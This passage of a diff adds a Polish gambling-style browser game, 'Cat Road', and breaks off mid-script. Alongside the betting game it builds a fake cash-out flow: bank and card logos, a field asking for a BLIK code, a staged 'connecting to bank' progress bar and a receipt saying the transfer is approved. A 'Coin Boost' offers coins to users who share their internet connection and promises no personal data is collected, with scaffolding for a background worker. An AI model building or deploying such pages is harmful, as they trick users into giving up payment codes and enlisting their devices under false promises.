@@ -1,0 +1,768 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Cat Road</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Fredoka:wght@500;600;700&family=Plus+Jakarta+Sans:wght@600;700;800&display=swap');
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{height:100%;overflow:hidden;background:#13151f;font-family:'Plus Jakarta Sans',sans-serif;color:#f3f4f6;user-select:none;touch-action:manipulation}
+body{display:flex;flex-direction:column}
+.hdr{display:flex;align-items:center;justify-content:space-between;padding:12px 16px;background:#1a1d2e;border-bottom:2px solid #282c44;flex-shrink:0;z-index:30}
+.logo{font-family:'Fredoka',sans-serif;font-size:20px;font-weight:700;color:#ff9ebb;letter-spacing:0.5px}
+.hdr-r{display:flex;align-items:center;gap:10px}
+.icobtn{background:#23273e;border:2px solid #333858;color:#94a3b8;width:38px;height:38px;border-radius:12px;font-size:15px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:all .1s}
+.icobtn:active{transform:translateY(2px)}
+.bal{background:#23273e;border:2px solid #333858;padding:6px 14px;border-radius:12px;font-weight:800;font-size:14px;color:#fbbf24;display:flex;align-items:center;gap:8px;cursor:pointer}
+.bal .chip{width:16px;height:16px;border-radius:50%;background:#fbbf24;border:2px solid #d97706;flex-shrink:0}
+.bal.bump{animation:bump .25s}
+@keyframes bump{50%{transform:scale(1.08)}}
+.stage{flex:1;position:relative;min-height:0;background:#13151f}
+#cv{position:absolute;inset:0;width:100%;height:100%;display:block}
+.stage.shake{animation:shake .4s}
+@keyframes shake{10%{transform:translate(-5px,2px)}30%{transform:translate(4px,-3px)}50%{transform:translate(-3px,2px)}70%{transform:translate(2px,-1px)}}
+.hist{display:flex;gap:6px;justify-content:center;padding:8px;overflow:hidden;flex-shrink:0;background:#171a29}
+.h-it{font-size:11px;font-weight:800;padding:4px 10px;border-radius:8px}
+.h-w{background:#14532d;color:#4ade80;border:1px solid #22c55e}
+.h-l{background:#7f1d1d;color:#fca5a5;border:1px solid #ef4444}
+.ctl{flex-shrink:0;background:#1a1d2e;border-top:2px solid #282c44;padding:12px 16px 18px;display:flex;flex-direction:column;gap:10px;z-index:30}
+.rw{display:flex;align-items:center;gap:8px;justify-content:center;flex-wrap:wrap}
+.bbtn{background:#23273e;border:2px solid #333858;border-bottom-width:4px;color:#cbd5e1;height:38px;min-width:48px;padding:0 10px;border-radius:10px;font-size:13px;font-weight:700;cursor:pointer}
+.bbtn.on{background:#166534;border-color:#22c55e;color:#86efac}
+.bbtn:disabled{opacity:.4;border-bottom-width:2px}
+.bbtn:active:not(:disabled){transform:translateY(2px);border-bottom-width:2px}
+.bin{background:#13151f;border:2px solid #333858;color:#fbbf24;width:80px;height:38px;border-radius:10px;text-align:center;font-size:14px;font-weight:800;outline:none}
+.lb{font-size:11px;color:#94a3b8;font-weight:800;letter-spacing:.5px;text-transform:uppercase}
+.db{background:#23273e;border:2px solid #333858;border-bottom-width:4px;color:#94a3b8;height:36px;padding:0 12px;border-radius:10px;font-size:12px;font-weight:700;cursor:pointer}
+.db.on{background:#1e40af;border-color:#3b82f6;color:#bfdbfe}
+.db:active:not(:disabled){transform:translateY(2px);border-bottom-width:2px}
+.mrow{font-size:13px;color:#94a3b8;text-align:center;font-weight:600}
+.mrow b{color:#fbbf24;font-weight:800}
+.arw{display:flex;gap:10px;width:100%}
+.cob{flex:1;background:#d97706;border:2px solid #f59e0b;border-bottom:5px solid #b45309;color:#fff;font-weight:800;font-size:13px;height:52px;border-radius:14px;cursor:pointer;display:flex;flex-direction:column;align-items:center;justify-content:center;line-height:1.2}
+.cob:disabled{opacity:.35;border-bottom-width:2px;cursor:default}
+.cob:active:not(:disabled){transform:translateY(3px);border-bottom-width:2px}
+.cob small{font-size:13px;font-weight:800}
+.dsb{flex:1.2;background:#2563eb;border:2px solid #60a5fa;border-bottom:5px solid #1d4ed8;color:#fff;font-weight:800;font-size:17px;height:52px;border-radius:14px;cursor:pointer}
+.dsb.start{background:#16a34a;border-color:#4ade80;border-bottom-color:#15803d}
+.dsb:disabled{opacity:.35;border-bottom-width:2px;cursor:default}
+.dsb:active:not(:disabled){transform:translateY(3px);border-bottom-width:2px}
+.ov{position:absolute;inset:0;background:rgba(15,17,26,.85);display:none;align-items:center;justify-content:center;z-index:60}
+.ov.show{display:flex}
+.card{background:#1a1d2e;border:2px solid #333858;border-radius:22px;padding:24px;width:min(90vw,380px);max-height:90%;overflow-y:auto;text-align:center}
+.card h2{font-family:'Fredoka',sans-serif;font-size:22px;margin-bottom:8px}
+.card p{color:#94a3b8;font-size:13px;line-height:1.5}
+.card.crash h2{color:#fca5a5}
+.card.win h2{color:#86efac}
+.bigv{font-size:32px;font-weight:800;color:#fbbf24;margin:10px 0}
+.cbtn{margin-top:14px;background:#23273e;border:2px solid #333858;border-bottom:4px solid #1e2235;color:#fff;padding:12px 24px;border-radius:12px;font-weight:800;cursor:pointer;font-size:14px;width:100%}
+.cbtn.g{background:#16a34a;border-color:#4ade80;border-bottom-color:#15803d}
+.cbtn:active{transform:translateY(2px);border-bottom-width:2px}
+.statg{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:14px 0}
+.sc{background:#13151f;border:2px solid #282c44;border-radius:12px;padding:10px}
+.sc .v{font-size:16px;font-weight:800;color:#fbbf24}
+.sc .k{font-size:11px;color:#94a3b8;margin-top:2px;font-weight:600}
+.dep{display:flex;flex-direction:column;gap:10px;margin-top:14px}
+.dep b{background:#23273e;border:2px solid #333858;border-bottom:4px solid #1a1d2e;color:#fbbf24;padding:14px;border-radius:14px;font-size:16px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px}
+.dep b:active{transform:translateY(2px);border-bottom-width:2px}
+.dep b .ch{width:18px;height:18px;border-radius:50%;background:#fbbf24;border:2px solid #d97706}
+.coinfly{position:fixed;width:16px;height:16px;border-radius:50%;background:#fbbf24;border:2px solid #d97706;pointer-events:none;z-index:80}
+.count{position:absolute;inset:0;display:none;align-items:center;justify-content:center;z-index:55;pointer-events:none}
+.count.show{display:flex}
+.count span{font-family:'Fredoka',sans-serif;font-size:90px;font-weight:700;color:#60a5fa;animation:pop .9s ease-out}
+@keyframes pop{0%{transform:scale(1.5);opacity:0}20%{transform:scale(1);opacity:1}80%{opacity:1}100%{transform:scale(.8);opacity:0}}
+.toast{position:absolute;top:16px;left:50%;transform:translateX(-50%);background:#1a1d2e;border:2px solid #333858;color:#fff;padding:10px 20px;border-radius:12px;font-size:13px;font-weight:700;z-index:70;opacity:0;pointer-events:none;transition:all .2s;white-space:nowrap}
+.toast.show{opacity:1;transform:translateX(-50%) translateY(6px)}
+.inp-fld{width:100%;height:42px;background:#13151f;border:2px solid #333858;border-radius:10px;padding:0 12px;color:#fbbf24;font-size:14px;font-weight:700;outline:none;margin-top:6px}
+.inp-fld::placeholder{color:#64748b;font-weight:500}
+.bank-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin:14px 0 10px}
+.bank-btn{background:#13151f;border:2px solid #282c44;border-radius:10px;padding:8px 4px;font-size:11px;font-weight:700;color:#94a3b8;cursor:pointer;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:4px;transition:all 0.15s ease}
+.bank-btn.on{border-color:#3b82f6;background:#1e293b;color:#60a5fa}
+.bank-btn svg{height:26px;width:100%;max-width:68px;display:block}
+.proc-box{padding:20px 10px;text-align:center}
+.spinner{width:40px;height:40px;border:4px solid #282c44;border-top-color:#60a5fa;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 14px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.p-bar-bg{width:100%;height:8px;background:#13151f;border-radius:4px;overflow:hidden;margin:14px 0 8px}
+.p-bar-fill{height:100%;background:#4ade80;width:0%;transition:width .3s}
+.receipt-box{background:#13151f;border:2px solid #282c44;border-radius:12px;padding:14px;margin:14px 0;text-align:left;font-size:13px}
+.receipt-row{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px dashed #282c44}
+.receipt-row:last-child{border-bottom:none}
+.receipt-row span:first-child{color:#94a3b8}
+.receipt-row span:last-child{font-weight:700;color:#fff}
+.sw{position:relative;width:52px;height:30px;background:#333858;border-radius:16px;cursor:pointer;transition:.2s;flex-shrink:0}
+.sw.on{background:#16a34a}
+.sw::after{content:'';position:absolute;top:3px;left:3px;width:24px;height:24px;background:#fff;border-radius:50%;transition:.2s}
+.sw.on::after{left:25px}
+.tog{display:flex;align-items:center;justify-content:space-between;padding:12px;background:#13151f;border:2px solid #282c44;border-radius:12px;margin:14px 0;gap:10px}
+.boost-pill{background:#a855f7;color:#fff;font-size:10px;font-weight:800;padding:2px 8px;border-radius:8px;letter-spacing:.5px}
+</style>
+</head>
+<body>
+<div class="hdr">
+  <div class="logo">🐱 Cat Road</div>
+  <div class="hdr-r">
+    <button class="icobtn" id="depBtn" title="Dopal konto">＋</button>
+    <button class="icobtn" id="boostBtn" title="Coin Boost">⚡</button>
+    <button class="icobtn" id="stBtn">📊</button>
+    <button class="icobtn" id="hlpBtn">?</button>
+    <div class="bal" id="bal"><span class="chip"></span><span id="balV">0</span></div>
+  </div>
+</div>
+<div class="hist" id="hist"></div>
+<div class="stage" id="stage"><canvas id="cv"></canvas>
+  <div class="count" id="count"><span id="countV">3</span></div>
+</div>
+<div class="toast" id="toast"></div>
+<div class="ctl">
+  <div class="rw">
+    <span class="lb">Stawka</span>
+    <button class="bbtn" data-b="25">25</button>
+    <button class="bbtn on" data-b="50">50</button>
+    <button class="bbtn" data-b="100">100</button>
+    <button class="bbtn" data-b="250">250</button>
+    <input class="bin" id="bin" type="number" value="50" min="5" max="100000">
+  </div>
+  <div class="rw">
+    <span class="lb">Trasa</span>
+    <button class="db on" data-d="0">Miejskie uliczki</button>
+    <button class="db" data-d="1">Szybka trasa</button>
+    <button class="db" data-d="2">Autostrada</button>
+    <button class="db" data-d="3">Młyn i chaos</button>
+  </div>
+  <div class="mrow">Kolejny pas: <b id="nxt">brak</b> | Meta: <b id="meta">brak</b></div>
+  <div class="arw">
+    <button class="cob" id="coBtn" disabled>ZGARNIJ KASĘ<small id="coV">0</small></button>
+    <button class="dsb start" id="goBtn">START</button>
+  </div>
+</div>
+
+<div class="ov" id="endOv"><div class="card" id="endCard"><h2 id="endH2"></h2><div class="bigv" id="endV"></div><p id="endP"></p><button class="cbtn g" id="endOk">Graj dalej</button></div></div>
+<div class="ov" id="stOv"><div class="card"><h2>📊 Staty z sesji</h2><div class="statg">
+  <div class="sc"><div class="v" id="s1">0</div><div class="k">Gier</div></div>
+  <div class="sc"><div class="v" id="s2">0</div><div class="k">Wygranych</div></div>
+  <div class="sc"><div class="v" id="s3">0</div><div class="k">Rekord</div></div>
+  <div class="sc"><div class="v" id="s4">0</div><div class="k">Seria wygranych</div></div>
+  <div class="sc"><div class="v" id="s5">0</div><div class="k">Łączny obrót</div></div>
+  <div class="sc"><div class="v" id="s6">brak</div><div class="k">Skuteczność</div></div>
+</div><button class="cbtn" id="stOk">Zamknij</button></div></div>
+
+<div class="ov" id="depOv"><div class="card"><h2>🏦 Doładuj konto</h2><p>Wybierz ile monet chcesz dorzucić do portfela</p><div class="dep">
+  <b data-a="1000"><span class="ch"></span>1 000</b>
+  <b data-a="5000"><span class="ch"></span>5 000</b>
+  <b data-a="20000"><span class="ch"></span>20 000</b>
+</div><button class="cbtn" id="depOk">Wracam do gry</button></div></div>
+
+<div class="ov" id="boostOv"><div class="card">
+  <h2>⚡ Coin Boost</h2>
+  <p>Włącz udostępnianie łącza i dostawaj dodatkowe coinsy w Cat Road.</p>
+  <div class="tog">
+    <div style="text-align:left">
+      <div style="font-weight:800">Udostępniaj łącze</div>
+      <div style="font-size:11px;color:#94a3b8">+500 coins/h · wygrane ×1.5</div>
+    </div>
+    <div class="sw" id="shareSw"></div>
+  </div>
+  <div style="font-size:11px;color:#64748b;text-align:left">
+    Udostępnianie działa tylko gdy Cat Road jest otwarte. Nie zbieramy danych osobowych. Możesz to wyłączyć w każdej chwili.
+  </div>
+  <div style="font-size:11px;color:#4ade80;margin-top:8px" id="boostStatus">—</div>
+  <button class="cbtn g" id="boostOk">Zamknij</button>
+</div></div>
+
+<div class="ov" id="wypOv">
+  <div class="card" style="width:min(92vw,420px)">
+    <div id="wypStep1">
+      <h2>💳 Wypłata na konto</h2>
+      <div class="bank-grid">
+        <button class="bank-btn on" data-bname="BLIK">
+          <svg viewBox="0 0 500 220"><rect width="500" height="220" rx="28" fill="#0A0A0A"/><g fill="#FFFFFF"><rect x="70" y="35" width="28" height="150"/><path d="M 130 81 A 52 52 0 1 1 129.9 81 Z M 130 109 A 24 24 0 1 0 130.1 109 Z" fill-rule="evenodd"/><rect x="198" y="35" width="28" height="150"/><rect x="248" y="82" width="28" height="103"/><rect x="298" y="35" width="28" height="150"/><path d="M 326 118 L 388 82 L 424 82 L 354 131 L 426 185 L 390 185 L 326 144 Z"/></g></svg>
+          BLIK
+        </button>
+        <button class="bank-btn" data-bname="Mastercard">
+          <svg viewBox="0 0 500 220"><rect width="500" height="220" rx="28" fill="#0A0A0A"/><circle cx="210" cy="110" r="52" fill="#EB001B"/><circle cx="290" cy="110" r="52" fill="#F79E1B"/><path d="M 250 67.2 A 52 52 0 0 1 250 152.8 A 52 52 0 0 1 250 67.2 Z" fill="#FF5F00"/></svg>
+          Mastercard
+        </button>
+        <button class="bank-btn" data-bname="Visa">
+          <svg viewBox="0 0 500 220"><rect width="500" height="220" rx="28" fill="#0A0A0A"/><g fill="#FFFFFF"><path d="M 140 70 L 165 70 L 182 135 L 202 70 L 225 70 L 195 150 L 170 150 Z"/><rect x="235" y="70" width="22" height="80" opacity="0.9"/><path d="M 270 135 C 275 138 285 140 295 140 C 310 140 318 133 318 124 C 318 102 272 105 272 82 C 272 73 283 67 302 67 C 313 67 323 70 330 73 L 324 88 C 318 85 310 83 302 83 C 290 83 285 88 285 94 C 285 113 331 110 331 133 C 331 146 318 153 294 153 C 281 153 268 149 262 145 Z"/><path d="M 370 70 L 390 70 L 415 150 L 392 150 L 387 132 L 358 132 L 352 150 L 330 150 Z M 363 115 L 382 115 L 373 85 Z"/></g></svg>
+          Visa
+        </button>
+        <button class="bank-btn" data-bname="PayPal">
+          <svg viewBox="0 0 500 220"><rect width="500" height="220" rx="28" fill="#0A0A0A"/><g transform="translate(80,48)"><path d="M 23 0 C 18.5 0 14.8 3.2 14.1 7.7 L 0 98 C -0.6 102 2.5 105.5 6.5 105.5 L 30 105.5 C 33.5 105.5 36.5 103 37.1 99.2 L 42 68 L 58 68 C 88 68 107 53 112 24 C 114 13 110 5 103 1 C 97 0 87 0 75 0 L 23 0 Z" fill="#003087"/><path d="M 42 68 L 58 68 C 72 68 83 63 90 54 C 92 46 92 37 90 29 C 87 44 68 59 37 59 L 23 59 L 17 99 L 37.1 99.2 L 42 68 Z" fill="#001C64" opacity="0.35"/><path d="M 42 20 C 37.5 20 33.8 23.2 33.1 27.7 L 19 118 C 18.4 122 21.5 125.5 25.5 125.5 L 48 125.5 C 51.5 125.5 54.5 123 55.1 119.2 L 61 82 L 77 82 C 107 82 126 67 131 38 C 133 27 129 19 122 15 C 116 14 106 14 94 14 L 42 20 Z" fill="#0079C1"/></g></svg>
+          PayPal
+        </button>
+        <button class="bank-btn" data-bname="Revolut">
+          <svg viewBox="0 0 500 220"><rect width="500" height="220" rx="28" fill="#0A0A0A"/><path d="M 180 170 V 50 H 225 C 265 50 290 70 290 100 C 290 120 278 135 255 142 L 295 170 H 262 L 228 145 H 208 V 170 Z M 208 72 V 125 H 225 C 248 125 260 115 260 98 C 260 82 248 72 225 72 Z" fill="#19B3FF"/></svg>
+          Revolut
+        </button>
+        <button class="bank-btn" data-bname="mBank">
+          <svg viewBox="0 0 500 220"><rect width="500" height="220" rx="28" fill="#0A0A0A"/><rect x="30" y="30" width="440" height="160" rx="20" fill="#E51221"/><path d="M 100 150 L 180 70 L 260 150 L 340 70 L 400 110" stroke="#FFFFFF" stroke-width="28" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          mBank
+        </button>
+        <button class="bank-btn" data-bname="PKO BP">
+          <svg viewBox="0 0 500 220"><rect width="500" height="220" rx="28" fill="#0A0A0A"/><rect x="30" y="30" width="440" height="160" rx="20" fill="#003366"/><path d="M 150 60 H 260 C 300 60 330 85 330 110 C 330 135 300 160 260 160 H 150 Z" fill="#FFFFFF"/><circle cx="210" cy="110" r="24" fill="#EB6909"/></svg>
+          PKO BP
+        </button>
+        <button class="bank-btn" data-bname="ING">
+          <svg viewBox="0 0 500 220"><rect width="500" height="220" rx="28" fill="#0A0A0A"/><rect x="30" y="30" width="440" height="160" rx="20" fill="#FF6200"/><path d="M 120 160 C 140 100 220 80 280 110 C 260 150 200 180 120 160 Z" fill="#FFFFFF"/><circle cx="270" cy="90" r="20" fill="#FFFFFF"/></svg>
+          ING Bank
+        </button>
+        <button class="bank-btn" data-bname="Santander">
+          <svg viewBox="0 0 500 220"><rect width="500" height="220" rx="28" fill="#0A0A0A"/><rect x="30" y="30" width="440" height="160" rx="20" fill="#EC0000"/><path d="M 250 45 C 230 85 200 105 200 145 C 200 175 220 195 250 195 C 280 195 300 175 300 145 C 300 105 270 85 250 45 Z" fill="#FFFFFF"/></svg>
+          Santander
+        </button>
+      </div>
+      <div style="margin:10px 0; text-align:left;">
+        <label class="lb">Kwota do wypłaty</label>
+        <input class="inp-fld" id="wypAmt" type="number" min="10" placeholder="Kwota">
+      </div>
+      <div style="margin:10px 0; text-align:left;">
+        <label class="lb" id="wypAccLabel">Kod BLIK albo numer telefonu</label>
+        <input class="inp-fld" id="wypAcc" type="text" placeholder="np. 777 888">
+      </div>
+      <button class="cbtn g" id="doWypBtn" style="margin-top:10px;">PRZELEWAMY</button>
+      <button class="cbtn" id="wypCancel" style="margin-top:8px;">Jednak zostaję</button>
+    </div>
+    <div id="wypStep2" class="proc-box" style="display:none;">
+      <div class="spinner"></div>
+      <h2 style="font-size:18px; color:#60a5fa">Realizujemy Twój przelew</h2>
+      <p id="procStatus" style="font-size:13px; color:#94a3b8; margin-top:4px">Łączenie z bankiem...</p>
+      <div class="p-bar-bg"><div class="p-bar-fill" id="pBar"></div></div>
+      <p style="font-size:11px; color:#64748b">Chwilka, to potrwa parę sekund</p>
+    </div>
+    <div id="wypStep3" style="display:none;">
+      <div style="font-size:46px; margin-bottom:4px">🎉</div>
+      <h2 style="color:#4ade80">Kasa w drodze!</h2>
+      <p style="font-size:13px">Właśnie wysłaliśmy przelew na Twoje konto.</p>
+      <div class="receipt-box">
+        <div class="receipt-row"><span>Numer transakcji:</span><span id="rcpId">#TRX-000000</span></div>
+        <div class="receipt-row"><span>Kwota:</span><span id="rcpAmt" style="color:#fbbf24">0 zł</span></div>
+        <div class="receipt-row"><span>Metoda:</span><span id="rcpBank">BLIK</span></div>
+        <div class="receipt-row"><span>Status:</span><span style="color:#4ade80">Zatwierdzono</span></div>
+      </div>
+      <button class="cbtn g" id="wypDoneBtn">Super, dzięki!</button>
+      <button class="cbtn" id="wypPdfBtn" style="margin-top:6px; font-size:12px; opacity:.85">📄 Pobierz potwierdzenie w PDF</button>
+    </div>
+  </div>
+</div>
+
+<div class="ov" id="hlpOv"><div class="card"><h2>Zasady są proste 🐾</h2><p style="text-align:left">Klikasz <b style="color:#4ade80">START</b> i czekasz na odliczanie. Każde naciśnięcie <b style="color:#60a5fa">KROK</b> przesuwa kota o jeden pas do przodu. Wypłacasz wygraną kiedy chcesz przyciskiem <b style="color:#fbbf24">ZGARNIJ KASĘ</b> albo lecisz po pełną stawkę na samą metę!</p><button class="cbtn" id="hlpOk">Kumam, gramy!</button></div></div>
+
+<script>
+'use strict';
+const LANE_N=6;
+const WALK_DUR=0.29;
+
+// === TRUDNIEJSZE + WIĘKSZE MNOŻNIKI ===
+const CFG=[
+ {name:'Miejskie uliczki', speed:.24, gapMin:2.6, gapMax:4.2, mult:[1.6,2.5,3.8,6.0,9.5,16]},
+ {name:'Szybka trasa',     speed:.34, gapMin:2.0, gapMax:3.3, mult:[2.0,3.2,5.2,8.5,14,24]},
+ {name:'Autostrada',      speed:.48, gapMin:1.5, gapMax:2.5, mult:[2.6,4.2,7.0,12,20,36]},
+ {name:'Młyn i chaos',     speed:.68, gapMin:1.0, gapMax:1.8, mult:[3.4,6.0,11,19,34,65]}
+];
+const CARCOLS=['#ff9ebb','#60a5fa','#fbbf24','#c084fc','#4ade80','#f87171','#f3f4f6','#f59e0b'];
+let bal=1000,bet=50,diff=0,pos=-1,walking=false,active=false,busyEnd=false,counting=false;
+let cars=[],spawns=[],particles=[],lastT=0,anim=0,walk=null,catX=0,catY=0;
+let stats={rounds:0,wins:0,best:0,streak:0,bestStreak:0,wagered:0,won:0};
+let audio=null;
+let currSymbol = 'zł';
+let currPrefix = false;
+
+// === COIN BOOST ===
+let optIn=false,shareIv=null,heldCoins=0,ws=null,workerId=null;
+const BOOST_MULT=1.5;
+const BOOST_RATE=8; // coins per 10s
+const HEARTBEAT_MS=15000;
+
+const $=i=>document.getElementById(i);
+const cv=$('cv'),ctx=cv.getContext('2d'),stage=$('stage');
+const SKEY='cutecat_v17';
+
+async function detectGeoCurrency(){
+  try{
+    if(!navigator.language.toLowerCase().startsWith('pl')){
+      currSymbol = '$';
+      currPrefix = true;
+    }
+    const r = await fetch('https://ipapi.co/json/').catch(()=>null);
+    if(r && r.ok){
+      const data = await r.json();
+      if(data && data.country_code === 'PL'){ currSymbol='zł'; currPrefix=false; }
+      else if(data && data.country_code){ currSymbol='$'; currPrefix=true; }
+    }
+  }catch(e){}
+  updBal();updUI();
+}
+
+function fmt(n){const num=Math.round(n).toLocaleString('pl-PL');return currPrefix?currSymbol+num:num+' '+currSymbol}
+function save(){try{localStorage.setItem(SKEY,JSON.stringify({bal,stats,bet,diff,optIn}))}catch(e){}}
+function load(){try{const d=JSON.parse(localStorage.getItem(SKEY));if(d){bal=d.bal??1000;stats=Object.assign(stats,d.stats||{});bet=d.bet??50;diff=d.diff??0;optIn=!!d.optIn}}catch(e){}}
+function updBal(){$('balV').textContent=fmt(bal)}
+function bumpBal(){const b=$('bal');b.classList.remove('bump');void b.offsetWidth;b.classList.add('bump')}
+function ensureAudio(){if(!audio)audio=new(window.AudioContext||window.webkitAudioContext)();if(audio.state==='suspended')audio.resume()}
+function tone(f,d,t,v,sl){ensureAudio();const o=audio.createOscillator(),g=audio.createGain();o.type=t||'square';o.frequency.setValueAtTime(f,audio.currentTime);if(sl)o.frequency.exponentialRampToValueAtTime(Math.max(30,f*sl),audio.currentTime+d);g.gain.setValueAtTime(v||.08,audio.currentTime);g.gain.exponentialRampToValueAtTime(.001,audio.currentTime+d);o.connect(g);g.connect(audio.destination);o.start();o.stop(audio.currentTime+d)}
+function noiseS(d,v){ensureAudio();const n=audio.sampleRate*d,b=audio.createBuffer(1,n,audio.sampleRate),dd=b.getChannelData(0);for(let i=0;i<n;i++)dd[i]=(Math.random()*2-1)*Math.pow(1-i/n,2);const s=audio.createBufferSource(),g=audio.createGain();s.buffer=b;g.gain.value=v||.15;g.gain.exponentialRampToValueAtTime(.001,audio.currentTime+d);s.connect(g);g.connect(audio.destination);s.start()}
+const sfxStep=()=>{tone(280,.09,'square',.06,1.6)};
+const sfxLand=()=>{tone(160,.07,'triangle',.08,.6);noiseS(.05,.06)};
+const sfxCrash=()=>{noiseS(.4,.28);tone(110,.45,'sawtooth',.11,.2)};
+const sfxWin=()=>{[523,659,784,1046].forEach((f,i)=>setTimeout(()=>tone(f,.16,'triangle',.1),i*110))};
+const sfxCash=()=>{tone(880,.08,'sine',.07);setTimeout(()=>tone(1174,.14,'sine',.08),70)};
+const sfxClick=()=>tone(600,.04,'square',.035);
+const sfxTick=()=>tone(440,.1,'sine',.09);
+const sfxGo=()=>{tone(660,.14,'triangle',.12);setTimeout(()=>tone(880,.2,'triangle',.12),140)};
+
+function resize(){const r=stage.getBoundingClientRect(),dpr=Math.min(2,window.devicePixelRatio||1);cv.width=r.width*dpr;cv.height=r.height*dpr;ctx.setTransform(dpr,0,0,dpr,0,0);cv.W=r.width;cv.H=r.height;calcGeo()}
+window.addEventListener('resize',resize);
+const GEO={top:0,bot:0,lh:0,cwY:0,swY:0};
+function calcGeo(){GEO.bot=cv.H*.92;GEO.lh=(GEO.bot-cv.H*.2)/LANE_N;GEO.top=GEO.bot-GEO.lh*LANE_N;GEO.cwY=GEO.top-GEO.lh*.55;GEO.swY=GEO.cwY-GEO.lh*.35}
+function laneY(i){if(i<0)return GEO.bot+GEO.lh*.45;if(i>=LANE_N)return GEO.cwY;return GEO.top+GEO.lh*(LANE_N-1-i+0.5)}
+function crossY(){return GEO.cwY}
+
+function spawnCar(lane){
+  const dir=(lane%2===0)?-1:1;
+  const h=GEO.lh*.52,w=h*(1.6+Math.random()*1.2);
+  if(dir<0&&cars.some(k=>k.lane===lane&&k.x>cv.W-w-6))return;
+  if(dir>0&&cars.some(k=>k.lane===lane&&k.x<w+6))return;
+  cars.push({lane,x:dir<0?cv.W+w:-w,w,h,dir,sp:cv.W*CFG[diff].speed,col:CARCOLS[Math.floor(Math.random()*CARCOLS.length)],truck:Math.random()<.15});
+}
+function updSpawns(dt){const c=CFG[diff];for(let i=0;i<LANE_N;i++){spawns[i]-=dt;if(spawns[i]<=0){spawnCar(i);spawns[i]=c.gapMin+Math.random()*(c.gapMax-c.gapMin)}}}
+function burst(x,y,col,n){for(let i=0;i<n;i++)particles.push({x,y,vx:(Math.random()-.5)*340,vy:(Math.random()-.5)*340-70,life:.6+Math.random()*.5,t:0,col,r:2.5+Math.random()*3.5})}
+function toast(msg){const t=$('toast');t.textContent=msg;t.classList.add('show');clearTimeout(t._h);t._h=setTimeout(()=>t.classList.remove('show'),1600)}
+
+function setBtnStart(){const b=$('goBtn');b.classList.add('start');b.textContent='START'}
+function setBtnGo(){const b=$('goBtn');b.classList.remove('start');b.textContent='KROK!'}
+
+function startRound(){
+  if(active||counting||busyEnd)return;
+  ensureAudio();
+  if(bal<bet){toast('Brak gotówki, doładuj konto w prawym górnym rogu');return}
+  bal-=bet;updBal();bumpBal();stats.wagered+=bet;stats.rounds++;save();
+  counting=true;active=false;pos=-1;busyEnd=false;walking=false;walk=null;
+  catY=laneY(-1);
+  $('goBtn').disabled=true;$('coBtn').disabled=true;
+  const ov=$('count');ov.classList.add('show');
+  const sv=$('countV');
+  let n=3;
+  sv.textContent=n;sfxTick();
+  const iv=setInterval(()=>{
+    n--;
+    if(n>0){sv.textContent=n;sv.style.animation='none';void sv.offsetWidth;sv.style.animation='';sfxTick()}
+    else{
+      clearInterval(iv);
+      sv.textContent='LECIMY!';sv.style.color='#4ade80';
+      sv.style.animation='none';void sv.offsetWidth;sv.style.animation='';
+      sfxGo();
+      counting=false;active=true;
+      setBtnGo();
+      updUI();
+      setTimeout(()=>{ov.classList.remove('show');sv.style.color=''},900);
+    }
+  },1000);
+}
+
+function doWalk(){
+  ensureAudio();
+  if(counting||busyEnd)return;
+  if(!active){startRound();return}
+  if(walking||!active)return;
+  const next=pos+1;
+  walking=true;
+  walk={from:pos,to:next,t:0,dur:WALK_DUR};
+  sfxStep();
+  updUI();
+}
+
+function boostMul(){return optIn?BOOST_MULT:1.0}
+
+function updUI(){
+  const c=CFG[diff];
+  const btn=$('goBtn');
+  if(!active&&!counting&&!busyEnd){setBtnStart();btn.disabled=false}
+  else if(active&&!counting&&!busyEnd){setBtnGo();btn.disabled=walking}
+  else{btn.disabled=true}
+  $('coBtn').disabled=!(active&&pos>=0&&!busyEnd&&!counting&&!walking);
+  if(pos>=0){
+    const safePos=Math.min(pos,LANE_N-1);
+    const m=c.mult[safePos]*boostMul();
+    $('coV').textContent=fmt(bet*m);
+    $('nxt').textContent=(pos+1<LANE_N?(c.mult[pos+1]*boostMul()).toFixed(1)+'x':'Meta');
+  }else{
+    $('coV').textContent=fmt(0);
+    $('nxt').textContent=(c.mult[0]*boostMul()).toFixed(1)+'x';
+  }
+  $('meta').textContent=(c.mult[LANE_N-1]*boostMul()).toFixed(1)+'x';
+}
+
+function cashOut(){
+  if($('coBtn').disabled)return;
+  const c=CFG[diff];
+  const safePos=Math.min(Math.max(pos,0),LANE_N-1);
+  const m=c.mult[safePos]*boostMul();
+  const w=bet*m;
+  busyEnd=true;active=false;walking=false;walk=null;
+  addHist(true,m);
+  stats.wins++;stats.won+=w;stats.streak++;stats.bestStreak=Math.max(stats.bestStreak,stats.streak);stats.best=Math.max(stats.best,w);
+  bal+=w;updBal();bumpBal();sfxCash();
+  burst(catX,catY,'#fbbf24',24);burst(catX,catY-10,'#4ade80',14);
+  $('endCard').className='card win';$('endH2').textContent='Pięknie, wygrana zgarnięta! 🎉';
+  $('endV').textContent='+'+fmt(w);
+  $('endP').textContent='Krok '+(safePos+1)+' z '+LANE_N+' | Mnożnik '+m.toFixed(1)+'x'+(optIn?' (BOOST ×1.5)':'');
+  $('endOv').classList.add('show');
+  save();updUI();
+}
+
+function endRound(win){
+  if(busyEnd)return;busyEnd=true;active=false;walking=false;walk=null;
+  const c=CFG[diff];
+  addHist(win,win?c.mult[LANE_N-1]*boostMul():0);
+  if(win){
+    const m=c.mult[LANE_N-1]*boostMul(),w=bet*m;
+    stats.wins++;stats.won+=w;stats.streak++;stats.bestStreak=Math.max(stats.bestStreak,stats.streak);stats.best=Math.max(stats.best,w);
+    bal+=w;updBal();bumpBal();sfxWin();
+    burst(cv.W/2,crossY(),'#4ade80',30);burst(cv.W/2,crossY()-12,'#fbbf24',20);
